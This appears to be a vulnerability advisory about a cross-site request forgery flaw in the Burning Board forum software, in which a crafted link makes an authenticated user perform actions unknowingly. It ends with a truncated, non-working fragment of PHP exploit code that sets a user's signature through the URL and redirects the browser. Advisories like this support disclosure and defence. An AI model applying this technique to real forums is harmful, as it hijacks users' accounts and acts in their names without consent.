Burning Board is web forum software. It is written in PHP, back-ended by MySQL, and will run on most Unix and Linux variants as well as Microsoft Windows.

An attacker may allegedly create a malicious link which is capable of causing actions to be performed on the behalf of a legitimate Burning Board user who visits the link. To exploit this vulnerability, the attacker must manipulate URL parameters in the malicious link in such a way as to cause the desired actions to be performed by a user who visits the link. The legitimate forum user must also be authenticated via a cookie-based authentication credential. The malicious link may include BBCode.

It has been reported, but not confirmed, that other web forum software (such as phpBB) may also be affected by this vulnerability.

eros/236.jpg[/IMG]&signature=1"); /* Redirect browser*/
?>
